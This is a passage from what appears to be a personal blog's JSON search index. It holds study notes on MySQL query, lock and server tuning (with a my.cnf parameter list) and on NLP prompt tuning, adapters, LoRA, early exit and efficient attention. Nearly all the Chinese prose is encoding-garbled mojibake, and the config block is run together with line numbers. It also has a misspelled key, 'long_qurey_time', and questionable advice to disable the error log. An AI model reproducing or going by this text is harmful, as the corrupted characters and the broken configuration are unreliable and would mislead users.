å°½é‡åˆ›å»ºç»„åˆç´¢å¼•ï¼Œè€Œä¸æ˜¯å•åˆ—ç´¢å¼•ï¼š1ä¸ªç»„åˆç´¢å¼•ç­‰åŒäºå¤šä¸ªç´¢å¼•æ•ˆæœï¼ŒèŠ‚çœç©ºé—´ï¼›å¹¶ä¸”å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ä¼˜åŒ–ã€‚ LIMITä¼˜åŒ–ï¼šä¸€èˆ¬ä¼šå…ˆæ’åºï¼Œç„¶å limit é™åˆ¶è®°å½•è¡Œæ•° å¯ä»¥ä½¿ç”¨è¿æ¥æŸ¥è¯¢ï¼ˆJOINï¼‰ä»£æ›¿å­æŸ¥è¯¢ï¼Œè¿æ¥æŸ¥è¯¢æ—¶ä¸éœ€è¦å»ºç«‹ä¸´æ—¶è¡¨ï¼Œå…¶é€Ÿåº¦æ¯”å­æŸ¥è¯¢ å¿«ã€‚ å°è¡¨é©±åŠ¨å¤§è¡¨ï¼Œå»ºè®®ä½¿ç”¨left joinæ—¶ï¼Œä»¥å°è¡¨å…³è”å¤§è¡¨ï¼Œå› ä¸ºä½¿ç”¨joinçš„è¯ï¼Œç¬¬ä¸€å¼ è¡¨æ˜¯å¿…é¡»å…¨æ‰«æçš„ï¼Œä»¥å°‘å…³è”å¤šå°±å¯ä»¥å‡å°‘è¿™ä¸ªæ‰«ææ¬¡æ•° é¿å…å…¨è¡¨æ‰«æï¼Œmysqlåœ¨ä½¿ç”¨ä¸ç­‰äº(!=æˆ–è€…&lt;&gt;)çš„æ—¶å€™æ— æ³•ä½¿ç”¨ç´¢å¼•å¯¼è‡´å…¨è¡¨æ‰«æã€‚å¦‚æœå¯¹ç´¢å¼•ä½¿ç”¨ä¸ç­‰äºçš„æ“ä½œå°†ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆï¼Œè¿›è¡Œå…¨è¡¨æ‰«æã€‚ JOINä¸¤å¼ è¡¨çš„å…³è”å­—æ®µæœ€å¥½éƒ½å»ºç«‹ç´¢å¼•ï¼Œè€Œä¸”æœ€å¥½å­—æ®µç±»å‹æ˜¯ä¸€æ ·çš„ã€‚ WHEREæ¡ä»¶ä¸­å°½é‡ä¸è¦ä½¿ç”¨not inè¯­å¥ï¼ˆå»ºè®®ä½¿ç”¨not existsï¼‰ åˆç†åˆ©ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—ã€explainæ‰§è¡Œè®¡åˆ’æŸ¥è¯¢ã€show profileï¼ˆQuery Profilerå·¥å…·ï¼‰æŸ¥çœ‹SQLæ‰§è¡Œæ—¶çš„èµ„æºä½¿ç”¨æƒ…å†µã€‚ MySQL é” æŒ‰åŠŸèƒ½åˆ†ï¼š å…±äº«é”(shared lock)ï¼Œå³è¯»é”(read lock) æ’ä»–é”(exclusive lock)ï¼Œä¹Ÿå«å†™é”(write lock) æŒ‰ç²’åº¦åˆ†ï¼š å…¨å±€é”ï¼šé”æ•´databaseï¼Œç”±MySQLçš„SQL layerå±‚å®ç°çš„ã€‚ è¡¨çº§é”ï¼šé”æŸtableï¼Œç”±MySQLçš„SQL layerå±‚å®ç°çš„ã€‚ è¡Œçº§é”ï¼šé”æŸè¡Œæ•°æ®ï¼Œä¹Ÿå¯é”å®šè¡Œä¹‹é—´çš„é—´éš™ï¼Œç”±æŸäº›å­˜å‚¨å¼•æ“å®ç°ï¼ˆInnoDBï¼‰ InnoDBè¡Œé”æ˜¯é€šè¿‡ç»™ç´¢å¼•ä¸Šçš„ç´¢å¼•é¡¹åŠ é”æ¥å®ç°çš„ã€‚ å› æ­¤InnoDBè¿™ç§è¡Œé”å®ç°ç‰¹ç‚¹æ„å‘³ç€ï¼šåªæœ‰é€šè¿‡ç´¢å¼•æ¡ä»¶æ£€ç´¢çš„æ•°æ®ï¼ŒInnoDBæ‰ä½¿ç”¨è¡Œçº§é”ï¼Œå¦åˆ™ï¼ŒInnoDBå°†ä½¿ç”¨è¡¨é”ã€‚ æ€§èƒ½ å½±å“å› ç´ ï¼š æ•°æ®åº“è¡¨ç»“æ„ã€å¯¹æ€§èƒ½å½±å“æœ€å¤§ã€‘ ä½ä¸‹æ•ˆç‡çš„SQLè¯­å¥ è¶…å¤§çš„è¡¨ å¤§äº‹åŠ¡ æ•°æ®åº“é…ç½®ï¼šæœ€å¤§è¿æ¥æ•°ï¼Œè¿æ¥è¶…æ—¶ï¼Œçº¿ç¨‹ç¼“å­˜ï¼ŒæŸ¥è¯¢ç¼“å­˜ï¼Œæ’åºç¼“å­˜ï¼Œè¿æ¥æŸ¥è¯¢ç¼“å­˜ æ•°æ®åº“æ•´ä½“æ¶æ„ æŒ‡æ ‡ï¼š å“åº”æ—¶é—´ï¼šç”¨æˆ·ä»å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚ï¼Œå¹¶å¾—åˆ°å“åº”ï¼Œä»¥åŠå±•ç¤ºå‡ºæ¥çš„æ•´ä¸ªè¿‡ç¨‹çš„æ—¶é—´ ååé‡ (TPS) ï¼šæ¯ç§’äº‹åŠ¡æ•°ã€‚ä¸€ä¸ªäº‹åŠ¡æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç„¶åæœåŠ¡å™¨åšå‡ºå“åº”çš„è¿‡ç¨‹ã€‚åœ¨æ²¡æœ‰é‡åˆ°æ€§èƒ½ç“¶é¢ˆæ—¶ï¼ŒTPS = å¹¶å‘æ•°/å“åº”æ—¶é—´ å¹¶å‘ç”¨æˆ·æ•°ï¼šåŒä¸€æ—¶é—´ç‚¹ï¼Œå¯è¯·æ±‚æœåŠ¡å™¨çš„ç”¨æˆ·æ•° èµ„æºä½¿ç”¨ç‡ï¼šCPU å ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ã€è´Ÿè½½ã€ç½‘ç»œIO å“åº”æ—¶é—´è¶ŠçŸ­ã€åŒæ—¶æ‰¿å—çš„å¹¶å‘æ•°è¶Šå¤šã€ååé‡ä¼šè¶Šå¤§ã€å ç”¨çš„èµ„æºè¶Šå°‘ï¼Œåˆ™è¡¨æ˜ç³»ç»Ÿæ€§èƒ½è¶Šå¥½ã€‚ è¡¨ç»“æ„ä¼˜åŒ–ï¼š å°†å­—æ®µå¾ˆå¤šçš„è¡¨åˆ†è§£æˆå¤šä¸ªè¡¨ å› ä¸ºå½“ä¸€ä¸ªè¡¨çš„æ•°æ®é‡å¾ˆå¤§æ—¶ï¼Œä¼šç”±äºä½¿ç”¨é¢‘ç‡ä½çš„å­—æ®µçš„å­˜åœ¨è€Œå˜æ…¢ã€‚ å¢åŠ ä¸­é—´è¡¨ å¢åŠ å†—ä½™å­—æ®µï¼šåˆç†çš„åŠ å…¥å†—ä½™å­—æ®µå¯ä»¥æé«˜æŸ¥è¯¢é€Ÿåº¦ã€‚è¡¨çš„è§„èŒƒåŒ–ç¨‹åº¦è¶Šé«˜ï¼Œè¡¨å’Œè¡¨ä¹‹é—´çš„å…³ç³»è¶Šå¤šï¼Œéœ€è¦è¿æ¥æŸ¥è¯¢çš„æƒ…å†µä¹Ÿå°±è¶Šå¤šï¼Œæ€§èƒ½ä¹Ÿå°±è¶Šå·®ã€‚ æœåŠ¡å™¨ä¼˜åŒ–ï¼š è®¾ç½®è¶³å¤Ÿå¤§çš„ innodb_buffer_pool_size ï¼Œå°†æ•°æ®è¯»å–åˆ°å†…å­˜ä¸­ï¼Œç‰©ç†å†…å­˜çš„50%~80% ä½¿ç”¨è¶³å¤Ÿå¤§çš„å†™å…¥ç¼“å­˜ innodb_log_file_sizeï¼Œé™ä½ç£ç›˜å†™å…¥æ¬¡æ•° å…³é—­ä¸éœ€è¦çš„logï¼ˆé€šç”¨æŸ¥è¯¢æ—¥å¿—ã€æ…¢æŸ¥è¯¢æ—¥å¿—ã€é”™è¯¯æ—¥å¿—ï¼‰ï¼Œé™ä½ç£ç›˜å†™å…¥æ¬¡æ•° æ¯æäº¤1æ¬¡äº‹åŠ¡åŒæ­¥å†™åˆ°ç£ç›˜ä¸­ï¼Œsync_binlog=1ï¼Œå¯ä»¥è®¾ç½®ä¸ºn è„é¡µå innodb_buffer_pool_sizeçš„æ¯”ä¾‹æ—¶ï¼Œè§¦å‘åˆ·è„é¡µåˆ°ç£ç›˜ã€‚innodb_max_dirty_pages_pct=30ï¼Œæ¨èå€¼ä¸º25%~50%ã€‚ åå°è¿›ç¨‹æœ€å¤§IOæ€§èƒ½æŒ‡æ ‡ã€‚innodb_io_capacity=200ï¼Œé»˜è®¤200ï¼Œå¦‚æœSSDï¼Œè°ƒæ•´ä¸º5000~20000ã€‚ å…¨é‡æ—¥å¿—å»ºè®®å…³é—­ã€‚é»˜è®¤å…³é—­ã€‚ my.confæˆ–è€…my.iniæ–‡ä»¶çš„[mysqld]ç»„ä¸­ï¼Œå¸¸ç”¨çš„å‚æ•°å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728# 01-ç¼“å†²åŒºï¼Œå°†æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œä¿è¯ä»å†…å­˜è¯»å–æ•°æ®ã€‚å»ºè®®innodb_buffer_pool_sizeè®¾ç½®ä¸ºæ€»å†…å­˜å¤§å°çš„3/4æˆ–è€…4/5.innodb_buffer_pool_size=# 02-é™ä½ç£ç›˜å†™å…¥æ¬¡æ•°ã€‚æ¨è innodb_log_file_size è®¾ç½®ä¸º 0.25 *innodb_buffer_pool_sizeinnodb_log_file_size=# 03-è¡¨ç¤ºç¼“å†²æ± å­—èŠ‚å¤§å°ã€‚æ¨èå€¼ä¸ºç‰©ç†å†…å­˜çš„50%~80%ã€‚innodb_buffer_pool_size=# 04-ç”¨æ¥æ§åˆ¶redo logåˆ·æ–°åˆ°ç£ç›˜çš„ç­–ç•¥ã€‚innodb_flush_log_at_trx_commit=1# 05-æ¯æäº¤1æ¬¡äº‹åŠ¡åŒæ­¥å†™åˆ°ç£ç›˜ä¸­ï¼Œå¯ä»¥è®¾ç½®ä¸ºnã€‚sync_binlog=1# 06-è„é¡µå innodb_buffer_pool_sizeçš„æ¯”ä¾‹æ—¶ï¼Œè§¦å‘åˆ·è„é¡µåˆ°ç£ç›˜ã€‚ æ¨èå€¼ä¸º25%~50%ã€‚innodb_max_dirty_pages_pct=30# 07-åå°è¿›ç¨‹æœ€å¤§IOæ€§èƒ½æŒ‡æ ‡ã€‚é»˜è®¤200ï¼Œå¦‚æœSSDï¼Œè°ƒæ•´ä¸º5000~20000innodb_io_capacity=200# 08-æŒ‡å®šinnodbå…±äº«è¡¨ç©ºé—´æ–‡ä»¶çš„å¤§å°ã€‚innodb_data_file_path# 09-æ…¢æŸ¥è¯¢æ—¥å¿—çš„é˜ˆå€¼è®¾ç½®ï¼Œå•ä½ç§’ã€‚long_qurey_time=3# 10-mysqlå¤åˆ¶çš„å½¢å¼ï¼Œrowä¸ºMySQL8.0çš„é»˜è®¤å½¢å¼ã€‚binlog_format=row# 11-è°ƒé«˜è¯¥å‚æ•°åˆ™åº”é™ä½interactive_timeoutã€wait_timeoutçš„å€¼ã€‚max_connections=200# 12-è¿‡å¤§ï¼Œå®ä¾‹æ¢å¤æ—¶é—´é•¿ï¼›è¿‡å°ï¼Œé€ æˆæ—¥å¿—åˆ‡æ¢é¢‘ç¹ã€‚innodb_log_file_size# 13-å…¨é‡æ—¥å¿—å»ºè®®å…³é—­ã€‚é»˜è®¤å…³é—­ã€‚general_log=0 æå‡ç¡¬ä»¶è®¾å¤‡ï¼Œä¾‹å¦‚é€‰æ‹©å°½é‡é«˜é¢‘ç‡çš„å†…å­˜ï¼ˆé¢‘ç‡ä¸èƒ½é«˜äºä¸»æ¿çš„æ”¯æŒï¼‰ã€æå‡ç½‘ç»œå¸¦å®½ã€ä½¿ç”¨SSDé«˜é€Ÿç£ç›˜ã€æå‡CPUæ€§èƒ½ï¼ˆæ•°é‡å¤§äºé¢‘ç‡ï¼‰ç­‰ã€‚ å¯¹äºCPUå¯†é›†å‹åœºæ™¯å’Œé¢‘ç¹æ‰§è¡Œå¤æ‚SQLçš„åœºæ™¯ï¼ŒCPUçš„é¢‘ç‡è¶Šé«˜è¶Šå¥½ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Database","slug":"Notes/Database","permalink":"https://racleray.github.io/categories/Notes/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"https://racleray.github.io/tags/Database/"},{"name":"MySQL","slug":"MySQL","permalink":"https://racleray.github.io/tags/MySQL/"}],"author":"HeRui"},{"title":"Prompt, Adaptor, ...","slug":"Prompt-Adaptor","date":"2022-04-05T14:57:55.000Z","updated":"2024-01-09T03:12:40.582Z","comments":true,"path":"posts/7695beab.html","link":"","permalink":"https://racleray.github.io/posts/7695beab.html","excerpt":"Prompt and Adaptor and ... Record.","text":"é¢„è®­ç»ƒæ¨¡å‹æ²¡æœ‰é‚£ä¹ˆå®Œç¾ï¼Œå…¶ä¸­ä¸¤ä¸ªé—®é¢˜ï¼šä¸€ï¼Œé¢å¯¹æ•°æ®ç¨€ç¼ºçš„æƒ…å†µï¼Œå¾®è°ƒæ•ˆæœå¾ˆå¯èƒ½ä¸€èˆ¬ï¼›äºŒï¼Œæ¨¡å‹å‚æ•°é‡å¤§ï¼Œå­˜å‚¨ç©ºé—´å ç”¨è¾ƒå¤§ï¼Œè®¡ç®—é‡å¤§ã€‚ç›®å‰ç›¸åº”çš„å¯¹ç­–ï¼Œæ•ˆæœè¾ƒå¥½çš„æœ‰ï¼šPromptå–ä»£fine-tuningï¼Œè®¾è®¡Apdaterå‡å°‘æ¨¡å‹è®­ç»ƒå‚æ•°ã€‚ Prompt è®¾è®¡fine-tuningè¾“å…¥æ¨¡æ¿ï¼Œè®©æ¨¡å‹æ ¹æ®ä¸Šä¸‹æ–‡å¡«å……MASKã€‚ Input: [CLS] The spring break is coming soon. [MASK]. the spring break was over? | Label: no Input: [CLS] I am going to have dinner. [MASK]. I am going to eat something? | Label: yes MASK éƒ¨åˆ†å¯ä»¥æ˜¯å¤šä¸ªè¯ï¼Œé•¿åº¦å¯è°ƒã€‚ å¦‚ä½•åŠ å…¥ä»»åŠ¡labelä¿¡æ¯ï¼Ÿé€šè¿‡ verbalizerï¼Œå°† MASK éƒ¨åˆ†é¢„æµ‹çš„è¯ä¸labelçš„å•è¯å½¢æˆä¸€ä¸ªmapã€‚é¢„æµ‹çš„æ—¶å€™ï¼Œæ ¹æ®é¢„æµ‹çš„è¯å’Œmapï¼Œæ‰¾åˆ°å¯¹åº”çš„labelã€‚ é€šè¿‡é¢„è®­ç»ƒmodelï¼Œè‡ªå·±å­¦ä¹ å¤„ä»»åŠ¡ç›¸å…³çš„ promptã€‚å……åˆ†åˆ©ç”¨é¢„è®­ç»ƒä¿¡æ¯ï¼Œè¿™ç§æ–¹å¼çœ‹èµ·æ¥æ˜¯ä¸é”™çš„ã€‚ é—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆç¡®å®šä¸€ä¸ªå¥½çš„ verbalizer mapping ï¼Ÿ PET(Pattern-Exploiting Training) PET æ–¹æ¡ˆï¼ˆå°‘é‡æ ·æœ¬åŠç›‘ç£æƒ…æ™¯ï¼‰ï¼š åœ¨ç›‘ç£æ•°æ®ä¸Šï¼Œè¿›è¡Œå¤šä¸ªPromptèŒƒå¼tuningï¼Œå¾—åˆ°å¤šç»„ prompt å•è¯ï¼Œåˆ†åˆ«å¯¹åº”åˆ°ç›¸åº”çš„labelã€‚ åœ¨æ— ç›‘ç£æ•°æ®ä¸Šï¼Œå¤šä¸ªæ¨¡å‹è¿›è¡Œé¢„æµ‹ï¼Œæ¯ä¸ªæ¨¡å‹åˆ†åˆ«åœ¨å„è‡ªçš„ prompt å•è¯å€™é€‰é›†ä¸­ï¼Œè¿›è¡Œè¾“å‡ºçš„softmaxã€‚å¤šä¸ªæ¨¡å‹ç»“æœå–å¹³å‡ï¼Œå¾—åˆ°soft labelã€‚ï¼ˆè’¸é¦ä¹Ÿç”¨è¿™æ‹›ï¼Œä¸€äº›åŠç›‘ç£æˆ–è€…æ¨¡å‹ç²¾è°ƒéƒ½æœ‰ç”¨åˆ°è¿™ç§æ–¹æ³•ï¼‰ã€‚ è”åˆç›‘ç£æ•°æ®å’Œæ— ç›‘ç£æ•°æ®ï¼Œè¿›è¡Œè®­ç»ƒå¾—åˆ°æœ€ç»ˆçš„æ¨¡å‹ã€‚ iPET (Iterative PET) PET ä½œè€…å¯¹ PET çš„æ”¹è¿›ç‰ˆã€‚åªæ˜¯å°† PETçš„ä¸‰æ­¥ï¼Œè¿›è¡Œå¤šè½®ï¼ŒåŒæ—¶å¢å¤§label mappingçš„èŒƒå›´ã€‚å®éªŒæ•ˆæœï¼Œåœ¨å°æ ·æœ¬åœºæ™¯ä¸‹æ˜¯è¶…è¿‡ fine-tuning çš„ã€‚ä½†æ˜¯ï¼Œè¿™å¯¹æ¯”å®éªŒï¼Œæœ‰ç‚¹ä¸å…¬å¹³ã€‚å› ä¸ºæ˜¯åœ¨ fine-tuning å¹¶æ²¡ç²¾å¿ƒè®¾è®¡è¿‡çš„æ¡ä»¶ä¸‹çš„æ¯”è¾ƒã€‚ å¦å¤–ï¼ŒPETå¤šä¸ªæ¨¡å‹è®­ç»ƒçš„æ—¶é—´æˆæœ¬å’Œèµ„æºæ¶ˆè€—æ˜æ˜¾æ›´é«˜ã€‚é‚£ä¹ˆï¼Œè¿™äº›æˆæœ¬è½¬æ¢æˆå¯¹ fine-tuning æ–¹å¼ä¸‹ï¼Œæ„å»ºäººå·¥æ ‡æ³¨æ•°æ®çš„æˆæœ¬å‘¢ï¼Ÿåˆè¯¥æ€ä¹ˆè¯´ï¼Ÿæ˜¯ä¸æ˜¯è¿˜ç®€å•ç›´æ¥ä¸€äº›ï¼Ÿ LM-BFF(better few-shot fine-tuning of language models) LM-BFF åˆ™æ˜¯å¦ä¸€ç§æ€è·¯ï¼Œå¢åŠ æ›´å¤šçš„æç¤ºä¿¡æ¯ï¼Œè¾“å…¥åˆ°modelã€‚ å°†ä¸Šå›¾æ”¹ä¸ºï¼š åé¢åŠ ä¸Šäº†ä¸€ç»„ç¤ºä¾‹è¾“å…¥ï¼Œä½œä¸ºä¸€ç§æ˜¾ç¤ºæç¤ºã€‚å’ŒGPT3çš„æ–¹å¼æœ‰ç‚¹åƒã€‚ä½†æ˜¯LM-BFFå¯¹æ¨¡å‹è¿›è¡Œè®­ç»ƒçš„æ•°æ®ï¼Œæœ‰æ¢¯åº¦æ›´æ–°ã€‚GPT3æ²¡æœ‰æ¢¯åº¦æ›´æ–°ï¼Œåªæ˜¯ç”Ÿæˆæ¨¡å‹çš„inferenceæç¤ºã€‚ è¿™é‡Œçš„ mapping è®¾è®¡æ–¹å¼ï¼Œè®ºæ–‡ä½¿ç”¨äº†äººå·¥è®¾è®¡å’Œæ¨¡å‹è‡ªå·±å­¦ä¹ æ¨æ–­ä¸¤ç§æ–¹æ³•ã€‚æ•ˆæœè¿™èƒ½è¯´ç›¸å·®æ— å‡ ã€‚ Multitask Prompt Multitask Prompt ä½¿ç”¨å¤šä»»åŠ¡çš„æ–¹å¼ï¼Œæ¯ä¸ªä»»åŠ¡è®¾è®¡ä¸€ä¸ª prompt templateï¼Œè¿›è¡Œå­¦ä¹ ã€‚ç„¶ååœ¨æ¨¡å‹æ²¡æœ‰è§è¿‡çš„ä»»åŠ¡ä¸Šï¼Œå†è¿›è¡Œprompt inferenceï¼ŒæœŸæœ›æ¨¡å‹å®ç° zero-shot inferenceã€‚è®ºæ–‡å®éªŒç»“æœæ˜¾ç¤ºï¼Œä½¿ç”¨T5æˆ–è€…T0æ¨¡å‹è¿›è¡Œå¤šä»»åŠ¡Promptï¼Œæ›´å°‘çš„å‚æ•°é‡å°±å¯ä»¥è¾¾åˆ°ç”šè‡³è¶…è¿‡GPT3çš„æ•ˆæœã€‚ T0 Prompt repo Other multitask basedï¼š SPoT P-tuning v2 å‚æ•°åŒ– Prompt è®¾è®¡ verbalizer æ˜¾ç„¶ä¸å¤Ÿ AIã€‚æœ‰ç ”ç©¶è€…å°±ç›´æ¥æ—¶ç”¨å¯è®­ç»ƒçš„ token æ¥æ›¿ä»£ promptï¼Œç›´æ¥è®­ç»ƒ token å¯¹åº”çš„ç‰¹æ®Šçš„ embeddingã€‚ å¯¹äº GPT è¿™ç§è‡ªå›å½’æ¨¡å‹ï¼Œè®¾è®¡ prefix tokenï¼ŒåŠ åœ¨è¾“å…¥ sentence ä¹‹å‰ï¼›å¯¹äº T5ã€BART è¿™ç±»Encoder-Decoder æ¨¡å‹ï¼Œåœ¨Encoderå’ŒDecoderä¸¤è¾¹åŠ ä¸Š prefix-E å’Œ prefix-Dã€‚è®­ç»ƒæ—¶å°†åŸé¢„è®­ç»ƒæ¨¡å‹å‚æ•°freezeã€‚ è¿˜æœ‰åƒ P-tuning è¿™æ ·çš„æ–¹æ³•ï¼Œä½¿ç”¨ LSTM å¯¹ Prompt è¾“å…¥è¿›è¡Œé¢å¤–ç¼–ç ã€‚åŒæ—¶å¼€æ”¾ åŸé¢„è®­ç»ƒæ¨¡å‹å‚æ•°è¿›è¡Œè®­ç»ƒã€‚æ•ˆæœä¸é”™ï¼Œè¶…è¶Šäº† fine-tuning æ•ˆæœã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è®­ç»ƒèµ·æ¥çš„æˆæœ¬æ˜¾ç„¶æ¯”è¾ƒé«˜ã€‚ Tricks prompt å•è¯ä½¿ç”¨ label å•è¯åˆå§‹åŒ–ï¼Œæ•ˆæœç›¸æ¯”éšæœºåˆå§‹åŒ–è¦å¥½ã€‚ Adaptor Parameter-Efficient Fine-tuningï¼Œä¸è®­ç»ƒåŸé¢„è®­ç»ƒæ¨¡å‹çš„å‚æ•°ï¼Œåªè®­ç»ƒè®¾è®¡çš„ Adaptor ç»“æ„çš„å‚æ•°ã€‚ fine-tuning çš„æƒ³æ³•æ˜¯è®­ç»ƒåŸæ¨¡å‹å‚æ•°ï¼Œäº§ç”Ÿç›¸åº”ä»»åŠ¡çš„æœ‰æ•ˆ hidden representationã€‚ä½†æ˜¯ Adaptor æ˜¯å›ºå®šåŸæ¨¡å‹å‚æ•°ï¼Œè®¾è®¡ç»“æ„åœ¨åŸ hidden representation åŸºç¡€ä¸Šå¾—åˆ°ä»»åŠ¡ç›¸å…³çš„ hidden representationã€‚ å·¥å…·åº“ Adaptor Adaptor åªè®­ç»ƒ Adapter å±‚å‚æ•°ã€‚æ›´å°‘çš„è®­ç»ƒå‚æ•°ï¼Œæ›´å¥½çš„è®­ç»ƒæ•ˆæœã€‚ LoRA(Low-Rank Adaptation) LoRA åªåœ¨ Feed-forward å±‚ï¼Œå¢åŠ  Low-Rank Adaptationã€‚ Prefix Tuning Prefix Tuning æ˜¯ Prompt ä¸­çš„ä¸€ç§æ–¹æ³•ï¼Œå®ƒä¹Ÿæ˜¯é«˜æ•ˆè®­ç»ƒçš„ä¸€ç§è®¾è®¡ã€‚åªæ›´æ–° Prefix çš„å‚æ•°ã€‚ å¦å¤–ï¼Œä½¿ç”¨äº†è¿™ç§å½¢å¼çš„ Prompt Tuning å¯¹äºå¤šä»»åŠ¡è®­ç»ƒï¼Œæœ‰æ›´é«˜çš„æ•ˆç‡ã€‚ ç›´æ¥å°†ä¸åŒçš„ prefix ä¸€èµ·å¤šä»»åŠ¡è®­ç»ƒã€‚è¿™æ¯” PET è¿™ç§â€œè€å¤è‘£æ¨¡å‹â€æ•ˆç‡ä¸Šå¼ºå¤šäº†ã€‚ref æ··åˆå‹ TOWARDS A UNIFIED VIEW OF PARAMETER-EFFICIENT TRANSFER LEARNING ç»“åˆäº†å‡ ç§å¸¸è§æ–¹æ³•ï¼š å¾—åˆ°æ›´å¥½çš„æ•ˆæœã€‚å¦å¤–æ€»ç»“äº†å‡ ç§å¸¸è§çš„å½¢å¼ã€‚ Early Exit å¦ä¸€ç§æ€è·¯ï¼Œä¸æ˜¯ Adaptor ç±»å‹çš„ï¼Œä½†æ˜¯æ”¾åœ¨è¿™é‡Œä¸€èµ·å¯¹æ¯”äº†ã€‚ è¿™ç§æ–¹æ³•è®¤ä¸ºï¼Œæ¨¡å‹åœ¨è¶Šé«˜çš„å±‚çš„è¾“å‡ºå­˜åœ¨ over thinking çš„å¯èƒ½ã€‚æ‰€ä»¥ï¼Œè€ƒè™‘æå‰ç»“æŸè®­ç»ƒï¼Œåœ¨è¾ƒä½çš„å±‚å°±è¾“å‡ºã€‚ æœ‰å‡ ç§æ–¹æ³•ï¼š Multi Exit åœ¨æ¯ä¸€å±‚éƒ½è®¾ç½®ä¸€ä¸ªè¾“å‡ºå±‚ï¼Œè”åˆæ¯ä¸€å±‚è¾“å‡ºè¿›è¡ŒæŸå¤±è®¡ç®—ï¼Œå¹¶ç»™æ›´é«˜çš„å±‚æ›´å¤§çš„æƒé‡ã€‚æœ€åé€‰æ‹©å…¶ä¸­ä¸€å±‚æœ€ä¸º inference è¾“å‡ºã€‚å¯ä»¥æŒ‡å®šæŸä¸€å±‚ã€‚åŠ¨æ€è¾“å‡ºçš„æ–¹æ³•æœ‰ä¸‹é¢å‡ ç§ã€‚ Shallow-deep Shallow-deepå…¶ä¸­ä½¿ç”¨æ–¹æ³•æ˜¯ï¼Œå¯¹äºæ¯ä¸€å±‚åˆ†ç±»ç»“æœï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ªå¤§äºæŸä¸ªé˜ˆå€¼çš„å±‚ï¼Œè¿›è¡Œæœ€ç»ˆè¾“å‡ºã€‚ DeeBERT DeeBERT ç›¸æ¯”Shallow-deepï¼Œåªæ˜¯æŒ‡æ ‡ä¸ä¸€æ ·ï¼Œä½¿ç”¨entropyè¿›è¡Œæ¯”è¾ƒã€‚ PABEE PABEE æ€è·¯æ¯”è¾ƒç®€å•ï¼Œæ¨¡å‹ä»ä¸‹å¾€ä¸Šå±‚ï¼Œè¿ç»­è¾“å‡ºåŒä¸€ä¸ª label çš„æ¬¡æ•°è¶…è¿‡é™åˆ¶ï¼Œå°±è¿›è¡Œè¾“å‡ºã€‚ å¯¹äºåˆ†ç±»ä»»åŠ¡ï¼Œæ¬¡æ•°é™åˆ¶è®¾è®¡ä¸º: å›å½’ä»»åŠ¡ï¼š å…¶ä»– Apdaptor è®¾è®¡æ–¹å¼ï¼Œåœ¨å®éªŒä¸­æ›´ä¸æ˜“è¿‡æ‹Ÿåˆï¼Œå¹¶ä¸”æ¨¡å‹è¿ç§»è®­ç»ƒæ•ˆæœæ›´å¥½ã€‚å¯¹äºå°æ•°æ®é›†ä¹Ÿæœ‰ä¸é”™çš„æ•ˆæœã€‚ é•¿åºåˆ—ä¼˜åŒ– ä¸»è¦é’ˆå¯¹ self-attention åœ¨é•¿åºåˆ—ä»»åŠ¡ä¸Šçš„å¤§è®¡ç®—é‡è¿›è¡Œè®¾è®¡ä¼˜åŒ–ã€‚ æ€è·¯æœ‰å‡ ç§ï¼š Longformer, BigBird: æ›´æ”¹attention windowï¼Œè®¾è®¡å±€éƒ¨ attentionï¼Œç©ºæ´ attentionï¼Œéšæœº attentionï¼Œä»¥åŠåªå¯¹éƒ¨åˆ†è¯è¿›è¡Œå…¨å±€ attentionï¼Œè¿™äº›æ–¹æ³•ä¸€èµ·ä½¿ç”¨ã€‚ Reformerï¼šå¯¹key å’Œ queryå…ˆè¿›æ€§å†…å­˜èšç±»ï¼Œå†æŒ‰ç°‡è¿›è¡Œattentionã€‚ Linformerï¼šå¯¹keyè¿›è¡Œçº¿æ€§å˜æ¢ï¼Œé™ä½keyçš„ä¸ªæ•°ã€‚ Efficient attentionï¼ŒLinear Transformerï¼ŒPerformerï¼šå°†queryå’Œkeyçš„çŸ©é˜µè®¡ç®—ï¼Œç»è¿‡ä¸€ä¸ªå˜é‡åˆ†è§£ï¼Œå› ä¸ºé•¿åºåˆ—è¿™ä¸¤ä¸ªçš„è®¡ç®—é‡ä¼šO(n^2)çº§å˜å¤§ï¼Œè€Œä¸”è¿™æ˜¯å¯ä»¥é€šè¿‡ç±»ä¼¼æ ¸å‡½æ•°çš„æ–¹æ³•è¿›è¡Œåˆ†è§£çš„ã€‚å°†keyå’Œvalueçš„è®¡ç®—å…ˆè¿›æ€§ï¼Œæœ‰æ•ˆå‡å°‘è®¡ç®—é‡ã€‚å…³é”®å°±æ˜¯è¿™ä¸ªå˜æ¢çš„è®¾è®¡å½¢å¼ã€‚ Synthesizerï¼šä¸è®¡ç®—å¾—åˆ° attention weights äº†ï¼Œç›´æ¥è®¾ä¸ºè®¾è®¡çš„å›ºå®šå‚æ•°çŸ©é˜µã€‚ MLP-Mixerï¼ŒFnetï¼šattention freeï¼Œç›´æ¥ä¸attentionäº†ï¼Œä½¿ç”¨å…¶ä»–æ–¹å¼ã€‚ä¸åŒç»´åº¦å…¨è¿æ¥å±‚èåˆï¼Œæˆ–è€…è½¬åŒ–åˆ°â€œé¢‘åŸŸâ€è¿›è¡Œèåˆã€‚ æœ‰ç©ºæ•´ç†ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"},{"name":"prompt","slug":"prompt","permalink":"https://racleray.github.io/tags/prompt/"},{"name":"adaptor","slug":"adaptor","permalink":"https://racleray.github.io/tags/adaptor/"}],"author":"HeRui"},{"title":"Effective 